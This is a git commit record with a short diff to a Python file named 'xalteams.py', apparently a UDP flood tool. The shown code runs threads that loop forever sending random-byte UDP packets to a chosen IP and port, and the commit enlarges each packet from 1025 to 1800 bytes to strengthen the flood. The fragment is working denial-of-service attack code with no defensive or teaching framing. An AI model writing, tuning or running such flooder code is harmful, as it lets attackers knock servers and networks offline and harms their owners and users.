fc2eab874e1be90f642bd9765be58f9ee3a1a326
Maestro <95646935+MaestroXyz@users.noreply.github.com>
2021-12-17 15:05:08 +0700

    Update xalteams.py

--- xalteams.py
+++ xalteams.py
@@ -24,7 +24,7 @@ class MyThread(threading.Thread):
     def run(self):
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bytes = random._urandom(1025)
+            bytes = random._urandom(1800)
             pack = random._urandom(18)
             msg = Pacotes[random.randrange(0, 1)]
             sock.sendto(bytes, (ip, int(port)))
